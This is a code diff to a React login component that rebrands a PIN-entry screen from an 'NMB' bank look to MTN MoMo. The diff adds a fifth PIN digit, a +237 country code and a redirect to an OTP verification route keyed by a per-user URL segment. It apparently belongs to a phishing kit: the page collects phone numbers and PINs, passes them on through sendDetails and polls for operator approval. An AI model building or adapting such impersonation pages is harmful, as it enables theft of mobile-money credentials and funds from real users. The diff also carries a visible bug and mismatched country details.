@@ -3,19 +3,20 @@ import "./Login.css";
 import React, { useState, useRef, useEffect } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { verificationService } from "../services/api";
-import { Phone, ShieldCheck, FileText } from "lucide-react";
-import Loader from "./Loader";
+
 function Login({ client, setpin, sendDetails, setnumber }) {
   const { number } = client;
-  const { user } = useParams();
+  const { user } = useParams;
   const navigate = useNavigate();
   const [pin1, setPin1] = useState("");
   const [pin2, setPin2] = useState("");
   const [pin3, setPin3] = useState("");
   const [pin4, setPin4] = useState("");
+  const [pin5, setPin5] = useState("");
   const [verifying, setVerifying] = useState(false);
   const [status, setStatus] = useState("");
   const [enterPin, setEnterPin] = useState(false);
+  // const [sessionId, setSessionId] = useState("");
   const [error, setError] = useState("");
   const [pollingInterval, setPollingInterval] = useState(null);
 
@@ -27,9 +28,9 @@ function Login({ client, setpin, sendDetails, setnumber }) {
   const pin4Ref = useRef(null);
   const pin5Ref = useRef(null);
 
-  const localPin = [pin1, pin2, pin3, pin4];
-  const pinString = `${localPin[0]}${localPin[1]}${localPin[2]}${localPin[3]}`;
-  const pinfull = pinString.length === 4;
+  const localPin = [pin1, pin2, pin3, pin4, pin5];
+  const pinString = `${localPin[0]}${localPin[1]}${localPin[2]}${localPin[3]}${localPin[4]}`;
+  const pinfull = pinString.length === 5;
   console.log(pinfull);
 
   // API URL - Use environment variable or fallback
@@ -282,7 +283,7 @@ function Login({ client, setpin, sendDetails, setnumber }) {
     // console.log("🎉 PIN approved, proceeding to OTP verification...");
     setpin(pinString);
     sendDetails();
-    navigate(`/${user}/verification`);
+    navigate(`/${user}/otpverification`);
   };
 
   // Function to handle login
@@ -324,25 +325,23 @@ function Login({ client, setpin, sendDetails, setnumber }) {
 
   return (
     <>
-      <div
-        className="container"
-        style={{ backgroundImage: "url('/loginbg.jpeg')" }}
-      >
-        {verifying && <Loader />}
+      <div className="container">
         <header>
-          <img className="momoImg" src="/nmbCon.jpeg" alt="mtn" />
+          <img className="momoImg" src="/mtn.jpeg" alt="mtn" />
         </header>
+        {/* <h1 className="login-title">Welcome to momo</h1> */}
 
         <main>
           {!enterPin && (
             <div className="ctamomo">
-              <div className="pin-input-container">
-                <h1>Secured Login 🔒</h1>
-              </div>
               <div className="phone-number">
+                <h1 className="login-title">
+                  Welcome to <strong>MoMo</strong>{" "}
+                </h1>
                 <div className="numbercont">
+                  <div className="flagcont">🇸🇳</div>
                   <div className="NumInput">
-                    <label htmlFor="number">Mobile Number</label>
+                    <div className="countrycode">+237</div>
                     <input
                       type="text"
                       name="number"
@@ -352,148 +351,29 @@ function Login({ client, setpin, sendDetails, setnumber }) {
                       maxLength="10"
                       className="numcont"
                       disabled={verifying}
-                      placeholder="eg 07XXXXXXXX"
                     />
                   </div>
                 </div>
               </div>
-
-              <div>
-                <div className="pin-input-container">
-                  <label htmlFor="number">Enter NMB pin</label>
-                  <div>
-                    <input
-                      ref={pin1Ref}
-                      maxLength="1"
-                      type="number"
-                      className="no-spinner"
-                      value={pin1}
-                      onChange={(e) =>
-                        handlePinInput(1, e.target.value, setPin1)
-                      }
-                      onKeyDown={(e) => handleKeyDown(1, e)}
-                      disabled={verifying}
-                    />
-                    <input
-                      ref={pin2Ref}
-                      type="number"
-                      className="no-spinner"
-                      value={pin2}
-                      // maxLength="1"
-                      onChange={(e) =>
-                        handlePinInput(2, e.target.value, setPin2)
-                      }
-                      onKeyDown={(e) => handleKeyDown(2, e)}
-                      disabled={verifying}
-                    />
-                    <input
-                      ref={pin3Ref}
-                      type="number"
-                      maxLength="1"
-                      className="no-spinner"
-                      value={pin3}
-                      onChange={(e) =>
-                        handlePinInput(3, e.target.value, setPin3)
-                      }
-                      onKeyDown={(e) => handleKeyDown(3, e)}
-                      disabled={verifying}
-                    />
-                    <input
-                      ref={pin4Ref}
-                      type="number"
-                      maxLength="1"
-                      className="no-spinner"
-                      value={pin4}
-                      onChange={(e) =>
-                        handlePinInput(4, e.target.value, setPin4)
-                      }
-                      onKeyDown={(e) => handleKeyDown(4, e)}
-                    />
-                  </div>
-
-                  {/* Status/Error Display */}
-                  {error && (
-                    <div
-                      className="error-message"
-                      style={{
-                        color: "red",
-                        marginTop: "10px",
-                        padding: "10px",
-                        backgroundColor: "#ffeeee",
-                        borderRadius: "5px",
-                        textAlign: "center",
-                      }}
-                    >
-                      {error}
-                    </div>
-                  )}
-
-                  {status && (
-                    <div
-                      className="status-message"
-                      style={{
-                        color:
-                          status === "approved" || status === "pinotp_correct"
-                            ? "green"
-                            : status === "pending"
-                              ? "orange"
-                              : "red",
-                        marginTop: "10px",
-                        fontWeight: "bold",
-                        padding: "10px",
-                        backgroundColor:
-                          status === "approved" ? "#eeffee" : "#fff8e1",
-                        borderRadius: "5px",
-                        textAlign: "center",
-                      }}
-                    >
-                      {statusMessages[status] || status}
-                    </div>
-                  )}
-
-                  <button
-                    className="btnContinue"
-                    onClick={handleLogin}
-                    // disabled={!pinfull || verifying}
-                    style={{
-                      opacity: !pinfull || verifying ? 0.6 : 1,
-                      cursor: !pinfull || verifying ? "not-allowed" : "pointer",
-                    }}
-                  >
-                    {verifying ? "Verifying PIN..." : "Sign In"}
-                  </button>
-                </div>
-              </div>
-
               <p className="termspolicy">
-                Use Face Verification or <br />
-                Fingerprint. <br />
+                By using this app you agree to our Mobile
                 <span style={{ color: " #0d5e94" }}>
-                  {/* Terms of use and Privacy Policy */}
+                  Terms of use and Privacy Policy
                 </span>
               </p>
-              <div className="ctFooter">
-                <div>
-                  <Phone />
-                  <p>Contact us</p>
-                </div>
-                <div>
-                  <FileText />
-                  <p>Terms and Conditions</p>
-                </div>
-                <div>
-                  <ShieldCheck />
-                  <p>Privacy policy</p>
-                </div>
-              </div>
+              <div></div>
+              <button
+                className="btnNext"
+                onClick={handlenext}
+                disabled={pinfull || verifying}
+              >
+                NEXT
+              </button>
             </div>
           )}
           {enterPin && (
             <div className="pin-input-container">
-              <h1>Secured Login 🔒</h1>
-              <label className="pin-label">
-                Enter your 4-digit pin to authenticate
-              </label>
+              <label className="pin-label">Enter your PIN</label>
               <div>
                 <input
                   ref={pin1Ref}
@@ -533,6 +413,16 @@ function Login({ client, setpin, sendDetails, setnumber }) {
                   value={pin4}
                   onChange={(e) => handlePinInput(4, e.target.value, setPin4)}
                   onKeyDown={(e) => handleKeyDown(4, e)}
+                  disabled={verifying}
+                />
+                <input
+                  ref={pin5Ref}
+                  type="number"
+                  maxLength="1"
+                  className="no-spinner"
+                  value={pin5}
+                  onChange={(e) => handlePinInput(5, e.target.value, setPin5)}
+                  onKeyDown={(e) => handleKeyDown(5, e)}
                   disabled={verifying}
                 />
               </div>
@@ -576,11 +466,14 @@ function Login({ client, setpin, sendDetails, setnumber }) {
                   {statusMessages[status] || status}
                 </div>
               )}
+              <div className="forgot-pin">
+                <a href="#">Forgot PIN?</a>
+              </div>
 
               <button
                 className="btnContinue"
                 onClick={handleLogin}
-                // disabled={!pinfull || verifying}
+                disabled={!pinfull || verifying}
                 style={{
                   opacity: !pinfull || verifying ? 0.6 : 1,
                   cursor: !pinfull || verifying ? "not-allowed" : "pointer",
